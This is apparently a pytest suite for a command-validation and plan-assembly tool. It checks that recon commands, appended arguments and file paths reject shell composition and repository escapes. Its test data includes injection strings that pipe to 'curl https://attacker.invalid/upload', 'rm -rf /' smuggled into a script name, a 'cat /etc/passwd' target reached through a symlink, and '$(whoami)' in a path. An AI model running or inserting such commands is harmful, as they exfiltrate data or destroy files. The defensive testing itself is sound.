import json
import subprocess
from copy import deepcopy
from pathlib import Path
from typing import Any

import pytest
from jsonschema import Draft202012Validator

from daydream.improve.assemble import (
    AssemblyIssue,
    assemble_plan,
    render_issue,
)
from daydream.improve.command_contract import (
    canonicalize_directory_scope,
    literal_command_error,
    path_is_confined,
    valid_directory_scope_lexical,
    valid_repository_file_path,
    validate_applicability,
    validate_host_commands,
    validate_recon_commands,
)
from daydream.improve.plans import (
    load_rejections,
    planned_fingerprints,
    record_rejections,
    write_plans,
)
from daydream.improve.prompts import (
    PLAN_AUTHOR_SCHEMA,
    build_plan_writer_repair_prompt,
)
from daydream.improve.repo_commands import enumerate_repository_commands


@pytest.mark.parametrize(
    ("literal", "expected"),
    [
        ("go build ./...", None),
        ("rg 'foo(bar)' src", None),
        ('grep -E "foo\\(bar\\)" src/app.py', None),
        ("pytest ...", "MALFORMED_COMMAND"),
        ("pytest tests (focused suite)", "MALFORMED_COMMAND"),
        ("pytest tests && rm -rf build", "MALFORMED_COMMAND"),
    ],
)
def test_verification_command_literal_validation(
    literal: str,
    expected: str | None,
) -> None:
    assert literal_command_error(literal) == expected


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args],
        cwd=repo,
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def _repo(tmp_path: Path) -> tuple[Path, str]:
    repo = tmp_path / "repo"
    (repo / "apps/catalog").mkdir(parents=True)
    (repo / "tests").mkdir()
    (repo / "README.md").write_text("# Catalog service\n", encoding="utf-8")
    (repo / "Makefile").write_text(
        "test:\n\tuv run pytest\n",
        encoding="utf-8",
    )
    (repo / "apps/catalog/api.py").write_text(
        "def list_catalog():\n"
        "    return [load_item(item_id) for item_id in item_ids]\n",
        encoding="utf-8",
    )
    (repo / "tests/test_catalog.py").write_text(
        "def test_list_catalog_returns_items():\n"
        "    assert list_catalog()\n",
        encoding="utf-8",
    )
    _git(repo, "init", "-b", "main")
    _git(repo, "config", "user.email", "test@example.com")
    _git(repo, "config", "user.name", "Test")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "initial")
    return repo, _git(repo, "rev-parse", "HEAD")


def _finding(*, fingerprint: str = "fp-fix-n-plus-one") -> dict[str, object]:
    return {
        "fingerprint": fingerprint,
        "title": "Fix N+1 catalog queries",
        "category": "performance",
        "path": "apps/catalog/api.py",
        "body": "The endpoint issues one query per catalog item.",
        "impact": "HIGH",
        "effort": "M",
        "risk": "MED",
        "confidence": "HIGH",
        "evidence": ["apps/catalog/api.py:1"],
    }


def _recon_commands() -> list[dict[str, Any]]:
    return [
        {
            "id": "test-suite",
            "purpose": "Run the repository Python test suite",
            "command": "uv run pytest",
            "working_directory": ".",
            "expected_success": {
                "exit_code": 0,
                "observable_result": "exit 0 and the selected pytest tests pass",
            },
            "applicability": {
                "scope": {"kind": "whole-repository"},
                "preconditions": [],
                "rationale": "The Makefile declares this repository-wide test entry point.",
            },
            "evidence": {
                "kind": "literal-command",
                "source_path": "Makefile",
                "line_anchor": {"start_line": 2, "end_line": 2},
                "verbatim_excerpt": "\tuv run pytest",
            },
        },
        {
            "id": "git-diff",
            "purpose": "Check that unrelated paths remain unchanged",
            "command": "git diff --exit-code",
            "working_directory": ".",
            "expected_success": {
                "exit_code": 0,
                "observable_result": "exit 0 and no unexpected diff is reported",
            },
            "applicability": {
                "scope": {"kind": "whole-repository"},
                "preconditions": [],
                "rationale": "Git repository metadata establishes the diff command.",
            },
            "evidence": {
                "kind": "literal-command",
                "source_path": "README.md",
                "line_anchor": {"start_line": 1, "end_line": 1},
                "verbatim_excerpt": "# Catalog service",
            },
        },
    ]


def test_recon_validation_retains_valid_siblings_when_one_is_invalid(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    commands = []
    for index in range(3):
        command = deepcopy(_recon_commands()[0])
        command["id"] = f"command-{index:02d}"
        commands.append(command)
    commands[1]["applicability"]["scope"]["kind"] = "unsupported"

    accepted, errors = validate_recon_commands(
        {"commands": commands},
        repo=repo,
    )

    assert [item["id"] for item in accepted] == ["command-00", "command-02"]
    assert errors == [
        "RECON_APPLICABILITY_INVALID@/commands/1/applicability/scope/kind"
    ]


@pytest.mark.parametrize(
    "model_excerpt",
    [
        pytest.param("uv run pytest", id="model-text-is-not-canonical"),
        pytest.param(None, id="model-text-is-optional"),
        pytest.param(42, id="model-text-has-non-string-shape"),
    ],
)
def test_recon_evidence_uses_locators_and_persists_host_excerpt(
    tmp_path: Path,
    model_excerpt: object,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Makefile").write_text(
        "test:\n\tuv run pytest\n\n",
        encoding="utf-8",
    )
    evidence: dict[str, Any] = {
        "kind": "literal-command",
        "source_path": "Makefile",
        "line_anchor": {"start_line": 2, "end_line": 3},
    }
    if model_excerpt is not None:
        evidence["verbatim_excerpt"] = model_excerpt
    command = _contract_recon_command(
        command_id="test-suite",
        command="uv run pytest",
        evidence=evidence,
    )
    raw_command = deepcopy(command)

    accepted, errors = validate_recon_commands(
        {"commands": [command]},
        repo=repo,
    )

    assert errors == []
    assert command == raw_command
    assert accepted[0]["evidence"]["verbatim_excerpt"] == "\tuv run pytest\n"


def test_invalid_recon_locator_rejects_only_its_candidate(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Makefile").write_text(
        "test:\n\tuv run pytest\n",
        encoding="utf-8",
    )
    valid = _contract_recon_command(
        command_id="test-suite",
        command="uv run pytest",
        evidence={
            "kind": "literal-command",
            "source_path": "Makefile",
            "line_anchor": {"start_line": 2, "end_line": 2},
        },
    )
    invalid = deepcopy(valid)
    invalid["id"] = "invalid-anchor"
    invalid["evidence"]["line_anchor"]["end_line"] = 20

    accepted, errors = validate_recon_commands(
        {"commands": [invalid, valid]},
        repo=repo,
    )

    assert [command["id"] for command in accepted] == ["test-suite"]
    assert errors == ["RECON_EVIDENCE_MISMATCH@/commands/0/evidence"]


def _contract_applicability(
    *paths: str,
    preconditions: list[str] | None = None,
) -> dict[str, Any]:
    scope: dict[str, Any]
    if paths:
        scope = {"kind": "in-scope-paths", "paths": list(paths)}
    else:
        scope = {"kind": "whole-repository"}
    return {
        "scope": scope,
        "preconditions": preconditions or [],
        "rationale": "This command is applicable to the declared repository scope.",
    }


def _contract_recon_command(
    *,
    command_id: str,
    command: str,
    evidence: dict[str, Any],
    working_directory: str = ".",
    paths: tuple[str, ...] = (),
) -> dict[str, Any]:
    return {
        "id": command_id,
        "purpose": f"Run the repository command {command_id}",
        "command": command,
        "working_directory": working_directory,
        "expected_success": {
            "exit_code": 0,
            "observable_result": "exit 0 and the declared command completes successfully",
        },
        "applicability": _contract_applicability(*paths),
        "evidence": evidence,
    }


def test_directory_scope_canonicalization_drops_the_trailing_slash(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    (repo / "frontend").mkdir(parents=True)
    applicability = _contract_applicability("frontend/")

    normalized, rejection = validate_applicability(applicability, repo=repo)

    assert rejection is None
    assert normalized is not None
    assert applicability["scope"]["paths"] == ["frontend/"]
    assert normalized["scope"]["paths"] == ["frontend"]
    assert canonicalize_directory_scope("frontend/") == "frontend"


def test_command_contract_schema_discloses_scope_cross_field_invariants() -> None:
    from daydream.improve.command_contract import APPLICABILITY_SCHEMA

    invalid_variants = [
        {
            "scope": {"kind": "whole-repository", "paths": ["frontend"]},
            "preconditions": [],
            "rationale": "Whole repository commands cannot also declare paths.",
        },
        {
            "scope": {"kind": "in-scope-paths", "paths": []},
            "preconditions": [],
            "rationale": "Scoped commands must identify at least one safe scope.",
        },
    ]

    validator = Draft202012Validator(APPLICABILITY_SCHEMA)
    assert all(list(validator.iter_errors(item)) for item in invalid_variants)


def test_host_enumerates_make_targets_and_package_scripts(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    (repo / "admin-dashboard").mkdir(parents=True)
    make_lines = [
        "SHELL := /bin/bash",
        ".PHONY: build test",
        "build: ## Build every module",
        "test: ## Run all tests",
        "test-frontend: ## Run frontend tests",
        "lint typecheck: ## Run all static checks",
        "\tuv run ruff check .",
    ]
    (repo / "Makefile").write_text(
        "\n".join(make_lines) + "\n",
        encoding="utf-8",
    )
    # No packageManager field: the corepack opt-in most repositories omit.
    (repo / "admin-dashboard/package.json").write_text(
        json.dumps(
            {
                "name": "admin-dashboard",
                "scripts": {"test": "vitest run", "build:app": "vite build"},
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    (repo / "admin-dashboard/pnpm-lock.yaml").write_text(
        "lockfileVersion: '9.0'\n",
        encoding="utf-8",
    )

    commands = enumerate_repository_commands(
        repo,
        directories=(".", "admin-dashboard"),
    )

    assert [item["command"] for item in commands] == [
        "make build",
        "make test",
        "make test-frontend",
        "make lint",
        "make typecheck",
        "pnpm test",
        "pnpm build:app",
    ]
    assert [item["id"] for item in commands] == [
        "make-build",
        "make-test",
        "make-test-frontend",
        "make-lint",
        "make-typecheck",
        "pnpm-test",
        "pnpm-build-app",
    ]
    by_command = {item["command"]: item for item in commands}
    assert by_command["make test"]["applicability"]["scope"] == {
        "kind": "whole-repository"
    }
    assert by_command["pnpm test"]["working_directory"] == "admin-dashboard"
    assert by_command["pnpm test"]["applicability"]["scope"] == {
        "kind": "in-scope-paths",
        "paths": ["admin-dashboard"],
    }
    assert (
        by_command["pnpm test"]["evidence"]["source_path"]
        == "admin-dashboard/package.json"
    )
    assert (
        by_command["pnpm test"]["evidence"]["verbatim_excerpt"].strip()
        == '"test": "vitest run",'
    )
    assert by_command["make test"]["evidence"]["line_anchor"] == {
        "start_line": 4,
        "end_line": 4,
    }
    assert enumerate_repository_commands(
        repo, directories=(".", "admin-dashboard")
    ) == commands


@pytest.mark.parametrize(
    ("manager_file", "expected"),
    [
        ("yarn.lock", "yarn test"),
        ("bun.lockb", "bun run test"),
        ("package-lock.json", "npm run test"),
        (None, "npm run test"),
    ],
)
def test_host_derives_the_invocation_for_each_package_manager(
    tmp_path: Path,
    manager_file: str | None,
    expected: str,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package.json").write_text(
        json.dumps({"name": "web", "scripts": {"test": "vitest run"}}) + "\n",
        encoding="utf-8",
    )
    if manager_file is not None:
        (repo / manager_file).write_text("{}\n", encoding="utf-8")

    commands = enumerate_repository_commands(repo)

    assert [item["command"] for item in commands] == [expected]


def test_host_enumeration_skips_unreadable_and_malformed_sources(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package.json").write_text("{not json", encoding="utf-8")

    assert enumerate_repository_commands(repo) == []


def test_host_ids_never_shadow_a_model_supplied_id(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Makefile").write_text("test:\n\tpytest\n", encoding="utf-8")

    commands = enumerate_repository_commands(repo, reserved_ids=["make-test"])

    assert [item["id"] for item in commands] == ["make-test-2"]
    assert commands[0]["command"] == "make test"


def test_host_enumeration_never_reads_outside_the_repository(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    (repo / "vendor").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "Makefile").write_text("leak:\n\tcat /etc/passwd\n", encoding="utf-8")
    (repo / "linked").symlink_to(outside, target_is_directory=True)

    assert enumerate_repository_commands(repo, directories=(".", "linked")) == []
    assert (
        enumerate_repository_commands(repo, directories=(".", "../outside")) == []
    )


def test_host_command_with_shell_composition_is_rejected(tmp_path: Path) -> None:
    """A manifest script key is arbitrary text and must clear the same gate."""
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package.json").write_text(
        json.dumps(
            {"name": "web", "scripts": {"ci && rm -rf /": "true", "test": "vitest"}},
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )

    candidates = enumerate_repository_commands(repo)
    accepted, errors = validate_host_commands(candidates, repo=repo)

    assert [item["command"] for item in candidates] == [
        "npm run ci && rm -rf /",
        "npm run test",
    ]
    assert [item["command"] for item in accepted] == ["npm run test"]
    assert errors == ["RECON_MALFORMED_COMMAND@/host_commands/0/command"]
    assert accepted[0]["evidence"]["kind"] == "host-derived"


@pytest.mark.parametrize(
    "scope",
    [
        "../frontend",
        "/frontend",
        "frontend/../../outside",
        "frontend/${PACKAGE}",
        "frontend/*",
    ],
)
def test_recon_applicability_directory_scopes_fail_closed(
    tmp_path: Path,
    scope: str,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    command = _contract_recon_command(
        command_id="make-test",
        command="make test",
        paths=(scope,),
        evidence={
            "kind": "literal-command",
            "source_path": "Makefile",
            "line_anchor": {"start_line": 1, "end_line": 1},
            "verbatim_excerpt": "make test",
        },
    )

    accepted, errors = validate_recon_commands(
        {"commands": [command]},
        repo=repo,
    )

    assert accepted == []
    assert errors == [
        "RECON_APPLICABILITY_INVALID@/commands/0/applicability/scope/paths/0"
    ]


def _ref(
    recon_command_id: str = "test-suite",
    appended_args: str | None = None,
    note: str | None = None,
) -> dict[str, Any]:
    return {
        "recon_command_id": recon_command_id,
        "appended_args": appended_args,
        "note": note,
    }


def _authored_plan(*, slug: str = "batch-catalog-queries") -> dict[str, Any]:
    focused = "tests/test_catalog.py -q"
    return {
        "slug": slug,
        "title": "Batch catalog queries before loading items",
        "priority": "P1",
        "why_this_matters": {
            "problem": "list_catalog currently loads each catalog item separately.",
            "concrete_cost": "Large catalogs create avoidable query latency per request.",
            "intended_outcome": "list_catalog batches item loading while preserving results.",
        },
        "scope": {
            "existing_paths": [
                {
                    "path": "apps/catalog/api.py",
                    "role": "Implement batched catalog loading.",
                    "excerpts": [{"start_line": 1, "end_line": 2}],
                },
                {
                    "path": "tests/test_catalog.py",
                    "role": "Add catalog query regression coverage.",
                    "excerpts": [{"start_line": 1, "end_line": 2}],
                },
            ],
            "new_paths": [],
            "out_of_scope_paths": [
                {
                    "path": "README.md",
                    "reason": "Catalog batching does not change user documentation.",
                }
            ],
            "out_of_scope_behaviors": [
                {
                    "behavior": "The public catalog response shape remains unchanged.",
                    "reason": "Existing API consumers depend on the current response.",
                }
            ],
        },
        "context_excerpts": [],
        "git_workflow": {
            "commit_boundaries": "Commit the behavior and its tests as one logical unit.",
            "commit_message_example": "perf: batch catalog item loading",
        },
        "steps": [
            {
                "title": "Batch item loading in list_catalog",
                "changes": [
                    {
                        "path": "apps/catalog/api.py",
                        "symbol": "list_catalog",
                        "operation": "modify",
                        "instruction": "Replace per-item load_item calls with one batched lookup.",
                        "target_state": "list_catalog performs one batch lookup and preserves order.",
                    },
                    {
                        "path": "tests/test_catalog.py",
                        "symbol": "test_list_catalog_batches_item_loading",
                        "operation": "modify",
                        "instruction": "Add a regression that counts the catalog loader calls.",
                        "target_state": "test_list_catalog_batches_item_loading proves one batch call.",
                    },
                ],
                "verification": _ref(
                    appended_args=focused,
                    note="Runs the focused catalog regression suite.",
                ),
            },
        ],
        "test_plan": {
            "exemplars": [
                {
                    "path": "tests/test_catalog.py",
                    "symbol": "test_list_catalog_returns_items",
                    "pattern_to_copy": "Use the existing direct function-call assertion style.",
                }
            ],
            "cases": [
                {
                    "name": "Catalog loading uses one batch query",
                    "test_file": "tests/test_catalog.py",
                    "test_symbol": "test_list_catalog_batches_item_loading",
                    "kind": "unit",
                    "setup": "Provide three item identifiers and a recording batch loader.",
                    "action": "Call list_catalog once with the three catalog identifiers.",
                    "assertions": [
                        "The loader receives all three identifiers in one call.",
                        "The returned catalog item order remains unchanged.",
                    ],
                    "verification": _ref(appended_args=focused),
                }
            ],
        },
        "done_criteria": [
            {
                "kind": "behavior",
                "description": "list_catalog performs one batch load for multiple items.",
                "verification": _ref(appended_args=focused),
            },
        ],
        "false_assumption": {
            "condition": "The load_item interface cannot accept multiple catalog identifiers.",
            "evidence_to_report": "Report the load_item signature and its only supported input.",
            "related_paths": ["apps/catalog/api.py"],
            "related_step_numbers": [1],
        },
        "additional_stop_conditions": [],
        "additional_command_refs": [],
        "maintenance_notes": {
            "future_interactions": [
                {
                    "area": "Catalog pagination",
                    "note": "Revisit the batch size if catalog pagination is introduced.",
                }
            ],
            "review_risks": [
                {
                    "risk": "Batch results could arrive in a different item order.",
                    "review_check": "Confirm the implementation restores requested identifier order.",
                }
            ],
            "deferred_items": [],
        },
    }


def _authored_new_file_plan() -> dict[str, Any]:
    plan = _authored_plan(slug="add-catalog-batching-regression")
    new_test = "tests/test_catalog_batching.py"
    plan["scope"]["new_paths"] = [
        {
            "path": new_test,
            "role": "Add focused catalog query batching regression coverage.",
        }
    ]
    test_change = plan["steps"][0]["changes"][1]
    test_change.update(path=new_test, operation="create")
    plan["test_plan"]["cases"][0]["test_file"] = new_test
    return plan


def _assembled(
    repo: Path,
    plan: dict[str, Any] | None = None,
    *,
    commands: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    assembled, issues = assemble_plan(
        plan or _authored_plan(),
        repo=repo,
        recon_commands=commands if commands is not None else _recon_commands(),
    )
    assert issues == ()
    assert assembled is not None
    return assembled


def _selection(
    repo: Path,
    *,
    plan: dict[str, Any] | None = None,
    fingerprint: str = "fp-fix-n-plus-one",
) -> dict[str, Any]:
    """Model one landed plan-writer result: real assembler output plus finding."""
    return {"finding": _finding(fingerprint=fingerprint), **_assembled(repo, plan)}


def _issues(
    repo: Path,
    plan: dict[str, Any],
    *,
    commands: list[dict[str, Any]] | None = None,
) -> tuple[AssemblyIssue, ...]:
    assembled, issues = assemble_plan(
        plan,
        repo=repo,
        recon_commands=commands if commands is not None else _recon_commands(),
    )
    assert assembled is None
    assert issues
    return issues


def _authoring_failure_selection(
    issues: tuple[AssemblyIssue, ...],
    *,
    fingerprint: str = "fp-fix-n-plus-one",
) -> dict[str, Any]:
    """Model the orchestrator's second-attempt authoring-failure selection."""
    return {
        "finding": _finding(fingerprint=fingerprint),
        "_attempt": {
            "received_result": None,
            "errors": tuple(render_issue(issue) for issue in issues),
            "validation": True,
        },
        "error": True,
    }


def test_assembled_plan_renders_complete_deterministic_handoff(tmp_path: Path) -> None:
    repo, sha = _repo(tmp_path)
    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **_assembled(repo)}],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
    assert "## Maintenance notes" in text
    assert "### Step 1: Batch item loading in list_catalog" in text
    assert "**Command**: `uv run pytest tests/test_catalog.py -q`" in text
    assert "**Why this gate**: Runs the focused catalog regression suite." in text
    assert "test_list_catalog_batches_item_loading" in text
    assert "apps/catalog/api.py:1-2" in text
    assert "return [load_item(item_id) for item_id in item_ids]" in text
    assert "**Branch**: improve/batch-catalog-queries" in text
    assert "TODO" in (repo / "daydream_plans/README.md").read_text()


MALFORMED_FIRST_RUN_COMMANDS = (
    "make test -> uv run pytest -n auto",
    "pre-push hook (...): uv lock --check && ...",
    "CI checks: uv run pytest -q",
    "Continuous integration => npm test",
    "uv run pytest -q (focused suite)",
    "Run this command: uv run pytest -q",
)


@pytest.mark.parametrize("literal", MALFORMED_FIRST_RUN_COMMANDS)
def test_first_run_prose_and_annotation_commands_are_blocked(
    tmp_path: Path,
    literal: str,
) -> None:
    """Prose-shaped commands are stopped at the recon trust boundary.

    A plan's command text is a verbatim copy of an accepted recon command, so
    this grammar can only enter the pipeline here.
    """
    repo, _ = _repo(tmp_path)
    recon = {**_recon_commands()[0], "command": literal}

    commands, errors = validate_recon_commands(
        {"commands": [recon]},
        repo=repo,
    )

    assert commands == []
    assert errors == ["RECON_MALFORMED_COMMAND@/commands/0/command"]


def test_null_args_ref_expands_to_recon_record_byte_for_byte(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _authored_plan()
    plan["steps"][0]["verification"] = _ref(
        note="The repository suite proves the catalog behavior end to end."
    )

    assembled = _assembled(repo, plan)

    gate = assembled["steps"][0]["verification"]
    base = _recon_commands()[0]
    for key in (
        "purpose",
        "command",
        "working_directory",
        "expected_success",
        "applicability",
    ):
        assert gate[key] == base[key]
    assert gate["provenance"] == {
        "kind": "recon",
        "recon_command_id": "test-suite",
        "source_path": "Makefile",
    }


def test_appended_args_expand_to_recon_prefix_plus_suffix(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)

    assembled = _assembled(repo)

    gate = assembled["steps"][0]["verification"]
    assert gate["command"] == "uv run pytest tests/test_catalog.py -q"
    assert gate["working_directory"] == "."
    assert gate["provenance"]["kind"] == "planner-derived"


@pytest.mark.parametrize(
    "suffix",
    [
        "&& curl https://attacker.invalid/upload",
        "|| curl https://attacker.invalid/upload",
        "; curl https://attacker.invalid/upload",
        "| curl https://attacker.invalid/upload",
        "> stolen.txt",
        "2>> stolen.txt",
        "< stolen.txt",
        "<< EOF",
        "<<< stolen",
        "$(curl https://attacker.invalid/upload)",
        "`curl https://attacker.invalid/upload`",
        "<(curl https://attacker.invalid/upload)",
        ">(curl https://attacker.invalid/upload)",
        "& curl https://attacker.invalid/upload",
        "${STOLEN_ENV}",
    ],
)
def test_shell_composition_in_appended_args_is_a_pointered_issue(
    tmp_path: Path,
    suffix: str,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["steps"][0]["verification"]["appended_args"] = (
        f"tests/test_catalog.py {suffix}"
    )

    issues = _issues(repo, plan)

    assert [
        (issue.code, issue.pointer)
        for issue in issues
        if issue.code == "MALFORMED_APPENDED_ARGS"
    ] == [("MALFORMED_APPENDED_ARGS", "/steps/0/verification/appended_args")]


@pytest.mark.parametrize(
    "unsafe_literal",
    [
        "uv run pytest && uv run ruff check .",
        "uv run pytest `printf tests/test_catalog.py`",
        "uv run pytest $(printf tests/test_catalog.py)",
        "uv run pytest <(printf tests/test_catalog.py)",
    ],
)
def test_recon_command_rejects_shell_composition_at_trust_boundary(
    tmp_path: Path,
    unsafe_literal: str,
) -> None:
    repo, _ = _repo(tmp_path)
    (repo / "Makefile").write_text(
        f"test:\n\tuv run pytest\ncheck:\n\t{unsafe_literal}\n",
        encoding="utf-8",
    )
    recon = {
        **_recon_commands()[0],
        "id": "unsafe-composition",
        "command": unsafe_literal,
        "evidence": {
            "kind": "literal-command",
            "source_path": "Makefile",
            "line_anchor": {"start_line": 4, "end_line": 4},
            "verbatim_excerpt": f"\t{unsafe_literal}",
        },
    }
    commands, errors = validate_recon_commands(
        {"commands": [recon]},
        repo=repo,
    )

    assert commands == []
    assert errors == [
        "RECON_MALFORMED_COMMAND@/commands/0/command"
    ]


def test_provenance_source_path_is_host_stamped_from_recon_evidence(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)

    assembled = _assembled(repo)

    stamped = {
        command["provenance"]["source_path"]
        for command in assembled["commands_you_will_need"]
    }
    assert stamped == {"Makefile"}


@pytest.mark.parametrize(
    "path",
    [
        "README.md (no precision/target/50% match)",
        "/tmp/catalog.py",
        "../catalog.py",
        "docs/catalog|tee.md",
        "docs/catalog#draft.md",
    ],
)
def test_annotated_absolute_escaping_and_metachar_paths_are_blocked(
    tmp_path: Path,
    path: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _authored_new_file_plan()
    plan["scope"]["new_paths"][0]["path"] = path
    plan["steps"][0]["changes"][1]["path"] = path
    plan["steps"][0]["changes"][1]["target_state"] = (
        f"{path} contains a deterministic catalog batching regression."
    )

    issues = _issues(repo, plan)
    result = write_plans(
        repo / "daydream_plans",
        [_authoring_failure_selection(issues)],
        planned_at=sha,
    )

    assert "AUTHOR_SCHEMA_INVALID" in {issue.code for issue in issues}
    assert result["written"] == []
    assert "AUTHOR_SCHEMA_INVALID" in (
        repo / "daydream_plans/README.md"
    ).read_text()


def _set_authored_path(plan: dict[str, Any], location: str, path: str) -> None:
    if location == "existing":
        plan["scope"]["existing_paths"][0]["path"] = path
    elif location == "new":
        plan["scope"]["new_paths"][0]["path"] = path
    elif location == "out-of-scope":
        plan["scope"]["out_of_scope_paths"][0]["path"] = path
    elif location == "context-excerpt":
        plan["context_excerpts"].append(
            {
                "path": path,
                "start_line": 1,
                "end_line": 1,
                "file_role": "Referenced context for the catalog change.",
            }
        )
    elif location == "step":
        plan["steps"][0]["changes"][0]["path"] = path
    elif location == "test":
        plan["test_plan"]["cases"][0]["test_file"] = path
    elif location == "test-exemplar":
        plan["test_plan"]["exemplars"][0]["path"] = path
    elif location == "stop-related":
        plan["false_assumption"]["related_paths"][0] = path
    else:
        raise AssertionError(f"unknown authored path location: {location}")


@pytest.mark.parametrize(
    "location",
    [
        "existing",
        "new",
        "out-of-scope",
        "context-excerpt",
        "step",
        "test",
        "test-exemplar",
        "stop-related",
    ],
)
def test_every_model_authored_path_rejects_a_symlink_crossing(
    tmp_path: Path,
    location: str,
) -> None:
    repo, _ = _repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    (repo / "escape").symlink_to(outside, target_is_directory=True)
    plan = _authored_new_file_plan()
    _set_authored_path(plan, location, "escape/pwn.py")

    issues = _issues(repo, plan)

    assert "PATH_OUTSIDE_REPOSITORY" in {issue.code for issue in issues}


# Path-grammar codes assembly raises for a path it will not accept. The
# recon-owned slots (a command's provenance source_path, its applicability
# scope, and its working directory) are deliberately absent: the model cannot
# author them, the host copies them from an already-confined recon record.
_PATH_REJECTION_CODES = {
    "AUTHOR_SCHEMA_INVALID",
    "MALFORMED_PATH",
    "PATH_OUTSIDE_REPOSITORY",
}


@pytest.mark.parametrize(
    "location",
    [
        "existing",
        "new",
        "out-of-scope",
        "context-excerpt",
        "step",
        "test",
        "test-exemplar",
        "stop-related",
    ],
)
def test_react_router_dollar_segment_is_valid(
    tmp_path: Path,
    location: str,
) -> None:
    repo, _ = _repo(tmp_path)
    path = "routes/user.$username.tsx"
    (repo / "routes").mkdir()
    (repo / path).write_text("export default function User() {}\n", encoding="utf-8")
    _git(repo, "add", path)
    _git(repo, "commit", "-m", "add literal dollar route")
    plan = _authored_new_file_plan()
    _set_authored_path(plan, location, path)

    _, issues = assemble_plan(
        plan,
        repo=repo,
        recon_commands=_recon_commands(),
    )

    assert valid_repository_file_path(path)
    assert path_is_confined(repo, path)
    assert _PATH_REJECTION_CODES.isdisjoint({issue.code for issue in issues})


@pytest.mark.parametrize("path", ["services/api/", "services/api"])
def test_out_of_scope_directory_prefix_accepts_trailing_slash(
    tmp_path: Path,
    path: str,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["scope"]["out_of_scope_paths"][0]["path"] = path

    _, issues = assemble_plan(
        plan,
        repo=repo,
        recon_commands=_recon_commands(),
    )

    assert valid_directory_scope_lexical(path)
    assert path_is_confined(repo, path, directory_scope=True)
    assert _PATH_REJECTION_CODES.isdisjoint({issue.code for issue in issues})


@pytest.mark.parametrize(
    "path",
    ["../outside.py", "src/$(whoami).py", "linked-outside/secret.py"],
)
def test_repository_file_path_rejects_escape_and_substitution(
    tmp_path: Path,
    path: str,
) -> None:
    repo, _ = _repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    (repo / "linked-outside").symlink_to(outside, target_is_directory=True)

    assert not (
        valid_repository_file_path(path) and path_is_confined(repo, path)
    )


@pytest.mark.parametrize("tracked", [False, True])
@pytest.mark.parametrize("scope_kind", ["existing_paths", "new_paths"])
def test_scope_paths_reject_tracked_and_untracked_symlinked_parents(
    tmp_path: Path,
    tracked: bool,
    scope_kind: str,
) -> None:
    repo, _ = _repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "pwn.py").write_text("outside = True\n", encoding="utf-8")
    (repo / "escape").symlink_to(outside, target_is_directory=True)
    if tracked:
        _git(repo, "add", "escape")
        _git(repo, "commit", "-m", "track escape symlink")
    plan = _authored_new_file_plan()
    if scope_kind == "existing_paths":
        plan["scope"]["existing_paths"][0]["path"] = "escape/pwn.py"
    else:
        plan["scope"]["new_paths"][0]["path"] = "escape/pwn.py"

    issues = _issues(repo, plan)

    assert "PATH_OUTSIDE_REPOSITORY" in {issue.code for issue in issues}


def test_valid_new_path_with_nonexistent_parent_remains_allowed(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _authored_new_file_plan()

    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **_assembled(repo, plan)}],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    assert "tests/test_catalog_batching.py" in (
        repo / "daydream_plans/001-add-catalog-batching-regression.md"
    ).read_text()


def test_unselected_recon_commands_are_not_injected_into_plan(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    commands = _recon_commands()
    commands.append(
        {
            **commands[0],
            "id": "unrelated-global-lint",
            "purpose": "Run the unrelated repository lint suite",
            "command": "uv run ruff check .",
        }
    )
    assembled = _assembled(repo, commands=commands)

    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **assembled}],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    # The same ref is used by the step, the named case, and a done criterion:
    # the derived table dedups them to one row and injects nothing else.
    assert [
        command["command"] for command in assembled["commands_you_will_need"]
    ] == ["uv run pytest tests/test_catalog.py -q"]
    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
    assert "uv run ruff check ." not in text
    assert "unrelated repository lint suite" not in text


@pytest.mark.parametrize(
    "model_excerpt",
    [
        pytest.param("WRONG stray model text", id="stray-model-text-is-ignored"),
        pytest.param(None, id="anchors-only-shape"),
        pytest.param(42, id="stray-non-string-shape-is-ignored"),
    ],
)
def test_plan_current_state_uses_locator_and_persists_host_excerpt(
    tmp_path: Path,
    model_excerpt: object,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _authored_plan()
    if model_excerpt is not None:
        plan["scope"]["existing_paths"][0]["verbatim_excerpt"] = model_excerpt
